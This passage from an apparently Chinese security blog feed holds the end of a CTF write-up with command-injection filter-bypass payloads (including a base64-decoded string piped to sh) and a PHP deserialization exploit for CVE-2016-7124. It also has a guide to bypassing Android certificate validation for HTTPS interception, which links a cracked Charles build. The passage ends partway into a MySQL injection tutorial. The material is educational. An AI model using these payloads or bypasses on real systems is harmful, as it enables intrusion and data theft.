class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多符号，空格，bash关键字(改用sh执行)，<code>.*f.*l.*a.*g.*</code>贪婪模式判断<code>f|l|a|g</code>的顺序不能出现。</p><p>这里我们使用<code>$IFS$数字</code>代替空格，而<code>.*f.*l.*a.*g.*</code>的绕过有下边三种方法。</p><h3 id="变量拼接法"><a href="#变量拼接法" class="headerlink" title="变量拼接法"></a>变量拼接法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;u&#x3D;g;cat$IFS$1fla$u.php</span><br></pre></td></tr></table></figure><h3 id="编码转换法"><a href="#编码转换法" class="headerlink" title="编码转换法"></a>编码转换法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;echo$IFS$1Y2F0IGZsYWcucGhwCg&#x3D;&#x3D;|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><h3 id="反引做参法"><a href="#反引做参法" class="headerlink" title="反引做参法"></a>反引做参法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;1;cat$IFS$1&#96;ls&#96; #打开工作目录的全部文件并返回内容</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>打开题目，无提醒，考点模糊的情况下：先查看响应头与HTML源代码，还是无头绪再进行文件扫描。</p><p>这里使用dirsearch扫描到有<code>www.zip</code>，访问之将源码down下来，这里贴个关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地打开phpstudy开个简单的服务器，复制class.php文件并添加如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; new Name(&#39;admin&#39;,100);</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>访问得到实例<code>$a</code>的序列化值(URL编码)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure><p>解码之后（不可见字符不处理）是这样子的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><p>此处用到一个漏洞(CVE-2016-7124，影响版本PHP5&lt;5.6.25，PHP7&lt;7.0.10)，当反序列化字符串中声明的属性个数大于实际提供的属性时，__wakeup函数并不会执行。</p><p>简单地说明这个漏洞就是，PHP底层在编写反序列代码时，将<code>__wakeup</code>函数的调用放在解析字符串功能之后，而如果解析字符串出现错误时就会直接<code>return 0;</code>，从而其后边的<code>__wakeup</code>魔法函数便调用不上。至于为何是修改变量个数，是因为若修改如变量名长度，会导致解析字符串的关键函数<code>pap_var_unserialize</code>出错，并将释放当前key(变量)空间，导致类中的变量赋值失败。而如果只是修改变量个数的话，便可以使得不出现上述错误而导致赋值失败，也可以让解析字符串功能出错返回0。</p><p>故EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好久没刷题了，真的生疏了很多。不仅很多很简单的点到不太记得了，甚至连简单的SQL题做的时候都愣了好一会儿，有点“无从下手”的感觉，看来平时还是得多话时间来刷刷题，而且从这次的刷题中，能明显看出自己对于许多考点都不熟悉，唉，还是太菜了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/qq_44657899/article/details/103239145">BUUCTF[强网杯 2019]随便注 的三种解法</a></li><li><p><a href="https://blog.csdn.net/qq_43619533/article/details/103434935">[SUCTF 2019]EasySQL</a></p></li><li><p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup">2018 HCTF Web Writeup</a></p></li><li><p><a href="https://blog.csdn.net/qq_42812036/java/article/details/104297163">[GXYCTF2019]Ping Ping Ping {命令执行总结}</a></p></li><li><p><a href="https://paper.seebug.org/866/">PHP 内核层解析反序列化漏洞</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 7.0以上使用VirtualXposed和Charles进行抓包</title>
      <link href="2020/Android%207.0%E4%BB%A5%E4%B8%8A%E4%BD%BF%E7%94%A8VirtualXposed%E5%92%8CCharles%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85/"/>
      <url>2020/Android%207.0%E4%BB%A5%E4%B8%8A%E4%BD%BF%E7%94%A8VirtualXposed%E5%92%8CCharles%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在对一个app进行测试的时候，尝试抓取数据包，发现以前的使用方法失效了，原因是随着安卓版本的提高，对证书的限制越发严格，而我身边的老机子放在学，不在身边，没得办法，只好研究一下怎么绕过这种限制。</p><p>经过一方查找，终于发现了一个相对比较简单的办法，这里就开一篇文章，记录一下。</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>首先下载所需要的工具：</p><a id="more"></a><ul><li>Charles——<a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a></li><li><p>Charles-Crack(有能力的同学请支持正版)——<a href="https://github.com/8enet/Charles-Crack">https://github.com/8enet/Charles-Crack</a></p></li><li><p>VirtualXposed——<a href="https://github.com/android-hacker/VirtualXposed/releases">https://github.com/android-hacker/VirtualXposed/releases</a></p></li><li>TrustMeAlready——<a href="https://github.com/ViRb3/TrustMeAlready/releases">https://github.com/ViRb3/TrustMeAlready/releases</a></li></ul><h2 id="PC端"><a href="#PC端" class="headerlink" title="PC端"></a>PC端</h2><p>PC端下载并安装好之后，运行Charles。</p><p>依次点击菜单栏的：Proxy→Proxy Settings，并按如下进行勾选。</p><p><img src="https://img.0x002.com/article/Charles/proxySetting.png" alt="Proxy Settings配置"></p><p>接着点击菜单栏：Proxy→SSL Proxying Settings</p><p>按照下图进行配置：</p><p><img src="https://img.0x002.com/article/Charles/SSLProxySetting.png" alt="SSL Proxying Settings配置"></p><p>若事先确定要抓取的Host和Port信息，可自行进行更改。</p><p>接着点击Proxy→Windows Proxy (注：不同版本名称不同)，将不再抓取本地流量。</p><p>然后点击Help→SSL Proxying→Install Charles Root Certificate on a Mobile Device or Remote Browser，将证书挂载到<code>chls.pro/ssl</code>这个地址上。</p><p>手机端用浏览器打开上述地址，将证书下载到本地。这步也可以选择点击菜单栏：Help→SSL Proxying→Save Charles Root Certificate…，来将证书下载到PC，通过数据线、QQ等方法传到手机。</p><h2 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h2><p>首先需要把手机与电脑连接到同一个网络内。</p><p>打开WLAN，选择对应的WIFI，进行代理配置。如下图所示：</p><p><img src="https://img.0x002.com/article/Charles/wifiSetting.jpg" alt="手机端WIFI代理配置"></p><p>主机名为PC端的内网IP，端口为配置Charles时Proxy Settings配置中的Http Proxy里的Port内容。</p><p>PC端内容不清楚的同学可以打开终端运行如下命令：</p><ul><li>Windows: <code>ipconfig</code></li><li>Linux: <code>ifconfig</code></li><li>Mac: <code>ifconfig</code></li></ul><p>成功代理上之后，手机端的流量都会经过PC端的Charles。如果是第一次配置，则Charles会弹出一个窗口，提示有新的连接，点击Allow按钮。</p><p>其次需要将电脑端Charles的证书给安装上。</p><p>若在PC端选择的是Install Charles Root Certificate on a Mobile Device or Remote Browse，则先需要通过手机浏览器访问<code>chls.pro/ssl</code>这个网址获得证书文件。</p><p>这里我使用的手机为小米8 Lite，不同的手机品牌/型号安装证书的方法可能有所不同，具体可通过搜索引擎来获得安装的方法。</p><p>依次点击：设置→更多设置→系统安全→加密与凭据→从SD卡安装，接着在文件浏览器中选择你下载好的证书。</p><p>然后给证书凭据起个名字，可随意填写，凭据用途选择<code>VPN和应用</code>。</p><p>安装完毕后依次点击：信任的凭证→用户，即可查看到刚刚添加进来的Charles证书——<code>XK72 Ltd</code>。</p><p>以往我们只需要执行到这里，便可以成功抓取到数据包。不过由于Android的版本更新，对用户自身添加的证书进行了限制，导致我们直接地无法抓取的HTTPS数据包，在Charles里会发现HTTPS的流量都显示Unknown。</p><p><img src="https://img.0x002.com/article/Charles/fail.png" alt="HTTPS流量不能成功解密"></p><p>这里我选择的办法是用VirtualXposed工具进行绕过，如果你不想使用这个方法，也可以考虑通过将手机进行Root处理，并将Charles的证书添加到系统级的证书中，不过这并不在本文讨论的范畴。</p><p>手机下载好VirtualXposed和TrustMeAlready两个apk文件，安装VirtualXposed.apk之后运行。</p><p>在VirtualXposed中，先进入设置页面，点击添加应用，选择你想抓取流量的应用，以及TrustMeAlready.apk文件进行安装。注意：由于TrustMeAlready.apk未安装，需要点击<code>+</code>号按钮，在对应的目录选择apk文件即可。</p><p>然后再回到设置页面，点击模块管理，可以看到我们刚刚添加的TrustMeAlready便在其中，点击右边的框框进行勾选，接着回到设置页面，在最下方点击重启、确定。</p><p>到这里我们便已经完成了全部的操作，之后你可以在VirtualXposed框架内打开任意的app都可以成功取到HTTPS流量。</p><p><img src="https://img.0x002.com/article/Charles/success.png" alt="成功抓取HTTPS流量并解密"></p><p>关于Charles的使用方法，本文不再赘述，网络上已有许多教程，稍微花点时间搜索即可。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="Android7-0-为何无法直接截取HTTPS流量"><a href="#Android7-0-为何无法直接截取HTTPS流量" class="headerlink" title="Android7.0+为何无法直接截取HTTPS流量"></a>Android7.0+为何无法直接截取HTTPS流量</h2><p>在Android开发者平台文档，我们可以查到这么一段话：</p><blockquote><p>默认情况下，来自所有应用的安全连接（使用 TLS 和 HTTPS 之类的协议）均信任预装的系统 CA，而面向 Android 6.0（API 级别 23）及更低版本的应用默认情况下还会信任用户添加的 CA 存储区。应用可以使用 <code>base-config</code>（应用范围的自定义）或 <code>domain-config</code>（网域范围的自定义）自定义自己的连接。</p><p><a href="https://developer.android.com/training/articles/security-config#CustomTrust">自定义可信 CA|Android Developer</a></p></blockquote><p>以上说明了安卓6.0以上的版本，在默认情况下应用是不会相信用户添加的CA证书，导致我们使用老方法无法完整地获取到应用发出的HTTPS数据。</p><h2 id="VirtualXposed-TrustMeAlready实现原理"><a href="#VirtualXposed-TrustMeAlready实现原理" class="headerlink" title="VirtualXposed+TrustMeAlready实现原理"></a>VirtualXposed+TrustMeAlready实现原理</h2><p>简单的说，VXP相当于手机上的虚拟机，在手机原有的系统上创建一块虚拟空间，类似沙盒般的效果，而通过TrustMeAlready插件，便可HOOK到 APK 中所有用于校验 SSL 证书的 API (详情可以点击参考里的《JustTrustMe原理分析》)，从而绕过证书校验，故此达到https抓包的效果。</p><blockquote><h3 id="一、什么是Virtual-Xposed？"><a href="#一、什么是Virtual-Xposed？" class="headerlink" title="一、什么是Virtual Xposed？"></a>一、什么是Virtual Xposed？</h3><h4 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h4><p>众所周知Xposed是来自国外<a href="https://forum.xda-developers.com/">XDA论坛</a>的rovo89开发的一款开源的安卓系统框架。</p><p>它是一款特殊的安卓App，其主要功能是提供一个新的应用平台，玩家们安装Xposed框架后，就能够通过Xposed框架搭建起的平台安装更多系统级的应用，实现诸多神奇的功能。</p><p>Xposed框架的原理是修改系统文件，替换了/system/bin/app_process可执行文件，在启动Zygote时加载额外的jar文件（/data/data/de.robv.android.xposed.installer/bin/XposedBridge.jar），并执行一些初始化操作(执行XposedBridge的main方法)。然后我们就可以在这个Zygote上下文中进行某些hook操作。</p><p>Xposed真正强大的是它可以hook调用的方法.当你反编译修改apk时,你可以在里面插入xposed的命令,于是你就可以在方法调用前后注入自己的代码.</p><p>Github开源地址: <a href="https://github.com/rovo89/Xposed">https://github.com/rovo89/Xposed</a></p><p>由于Xposed最大的弊端在于设备需要root，并且编写插件模块后需要重启手机（当然也有办法可以不用重启），所以有了VirtualApp。</p><h4 id="VirtualApp"><a href="#VirtualApp" class="headerlink" title="VirtualApp"></a>VirtualApp</h4><p>VirtualApp是一个App虚拟化引擎（简称VA）。</p><p>VirtualApp在你的App内创建一个虚拟空间（构造了一个虚拟的systemserver），你可以在虚拟空间内任意的安装、启动和卸载APK，这一切都与外部隔离，如同一个沙盒。</p><p>运行在VA中的APK无需在外部安装，即VA支持免安装运行APK。</p><p>熟悉android系统开机流程的应该知道各services是由system server启动一系列的系统核心服务（AMS,WMS,PMS等等）ViratualApp就是构建了一个虚拟system_process进程，这里面也有一系列的核心服务。</p><p>VirtualApp主要技术用到了反射和动态代理来实现的</p><p>Github开源地址：<a href="https://github.com/asLody/VirtualApp">https://github.com/asLody/VirtualApp</a></p><h4 id="VirtualXposed"><a href="#VirtualXposed" class="headerlink" title="VirtualXposed"></a>VirtualXposed</h4><p>VirtualXposed就是基于VirtualApp和epic 在非ROOT环境下运行Xposed模块的实现（支持5.0~8.1)。</p><p>Github开源地址：<a href="https://github.com/android-hacker/VirtualXposed">https://github.com/android-hacker/VirtualXposed</a></p><p>来源：<a href="http://jackzhang.info/2018/04/09/VirtualXposed/">http://jackzhang.info/2018/04/09/VirtualXposed/</a></p></blockquote><h2 id="HTTPS抓包为何需要安装抓包工具的CA证书"><a href="#HTTPS抓包为何需要安装抓包工具的CA证书" class="headerlink" title="HTTPS抓包为何需要安装抓包工具的CA证书"></a>HTTPS抓包为何需要安装抓包工具的CA证书</h2><p>为了弄清楚这个问题，我们首先得清楚SSL/TLS加密的原理。</p><p>通常来说，SSL与TLS都是非对称加密的，有一个公钥与私钥。公钥是公开的，私钥是私密的，存在于服务端。服务器返回的内容会被私钥加密，客户端需要使用公钥进行解密。同样的，用户端的数据便有公钥加密，私钥来解密。</p><p>而我们都知道，使用了SSL之后我们便可以保护我们的站点免受中间人攻击。那又何为中间人攻击呢？</p><p>举个例子，用户A要使用电脑访问网站<code>http://example.com</code>，而这台电脑已被攻击者B攻陷，那么攻击者B可通过修改A电脑上的hosts文件，将example.com的解析指向B自己的服务器，这样A用户就在”不知情“的情况下中了招。而如果该网站使用了SSL/TLS加密时，用户A在访问<code>https://example.com</code>的时候，需要向服务器请求公钥的内容，又因为公钥是放在CA证书里的，且CA证书通常是由相关的权威CA机构（权威性由微软等操作系统巨头决定）才能发布，类似我们的民政局才能发布身份证。这使得攻击者无法伪造CA证书，因为客户端在收到CA证书之后会根据不同的权威CA机构进行相应的验证，而若颁发该证书的机构不够权威（这使得权威机构也不会随意颁发CA证书，以免自身的权威性被取消），是不会被系统所信任的。这一连串的操作，使得使用了SSL/TLS的网站可以不受中间人攻击的影响。</p><p>OK回归正题，那这HTTPS抓包与中间人攻击有何关系呢？其实这两者的原理都是一样的，只不过攻击者的角色变成了抓包工具。</p><p>So，这次的问题就变成了中间人攻击如何在HTTPS通信中生效？</p><p>我们注意到，中间人攻击的最大难点就在于CA证书的权威性，而我们在没有域名解析权的情况下是不能去向权威CA机构申请证书的。那么既然如此，为何我们不考虑自己“开”一家权威机构呢，这样我们生成的证书不就会被信任了嘛。</p><p>这时候，就得需要安装我们抓包工具的CA证书了，这个证书与域名所有者向权威机构申请的证书不同，他是根证书。</p><p>因为域名的CA证书的验证过程也是非对称加密验证，也就说，CA证书的验证是由根证书里的公钥来解密验证的。通常操作系统里已经默认信任了一批权威机构的根证书。</p><p>所以，当我们把我们自己的根证书添加到操作系统中时，相当于我们自己“开”了一家权威CA机构，这样便可以解决了之前的难题。</p><blockquote><p>借一张网图：</p><p><img src="https://img.0x002.com/article/Charles/https_sniff.png" alt=""></p><p>源自：<a href="https://github.com/youngwind/blog/issues/108">图解 HTTPS：Charles 捕获 HTTPS 的原理</a></p></blockquote><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>别看上边方法好像挺简单的，实际操作起来却挺繁琐，网络上的方法大多抄来吵去且时效性很差，导致在操作过程中也走了许多弯路，许多东西还是自己实验之后才知道。看似简单的东西，其实写起来可学习的东西还是很多的，以前自己在学习的时候没有注意的点，现在看起来也是可以细细研究的。不骄不躁，Stay Hungry, Stay Foolish.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://developer.android.com/training/articles/security-ssl">通过 HTTPS 和 SSL 确保安全|Android开发者文档</a></li><li><p><a href="http://jackzhang.info/2018/04/09/VirtualXposed/">VirtualXposed插件开发-Xposed hook 之入门案例</a></p></li><li><p><a href="https://bbs.pediy.com/thread-214012.htm">JustTrustMe原理分析</a></p></li><li><a href="https://github.com/youngwind/blog/issues/108">图解 HTTPS：Charles 捕获 HTTPS 的原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 原创栏目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Charles </tag>
            
            <tag> Android </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对MYSQL注入相关内容及部分Trick的归类小结</title>
      <link href="2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/"/>
      <url>2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>本文首发于：<a href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关于的mysql注入的内容给全部罗列出来，既方便个人之后的复习，也方便后人查找相关资料。</p><p>本文部分内容可能会直接截取其他大牛的文章，截取的内容我都会进行声明处理。如有侵权，请发email联系我(asp-php#foxmail.com)删除。</p><h1 id="Mysql简介"><a href="#Mysql简介" class="headerlink" title="Mysql简介"></a>Mysql简介</h1><p>在正式讲解mysql注入的内容前，我认为还是有必要说明一下什么是mysql、mysql的特点是什么等内容，这些东西看起来可能对注入毫无帮助，开始却能很好的帮助我们学习，融会贯通。</p><blockquote><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种<strong>关联数据库管理系统</strong>，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL是<strong>开源</strong>的，所以你不需要支付额外的费用。</li><li>MySQL使用<strong>标准的 SQL 数据语言</strong>形式。</li><li>MySQL可以运行于多个系统上，并且<strong>支持多种语言</strong>。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL<strong>对PHP有很好的支持</strong>，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL<strong>支持大型数据库</strong>，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL是<strong>可以定制的</strong>，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><p>引自：<a href="https://www.runoob.com/mysql/mysql-tutorial.html">Mysql教程 | 菜鸟教程</a></p></blockquote><a id="more"></a><p>一个完整的mysql管理系统结构通常如下图：</p><p><img src="https://img.0x002.com/article/MysqlSQLi/databaseStruct.png" alt="数据库结构简易图"></p><p>可以看到，mysql可以管理<strong>多个数据库</strong>，一个数据库可以包含<strong>多个数据表</strong>，而一个数据表有含有<strong>多条字段</strong>，一行数据正是<strong>多个字段同一行</strong>的一串数据。</p><h1 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h1><p>简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。</p><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span 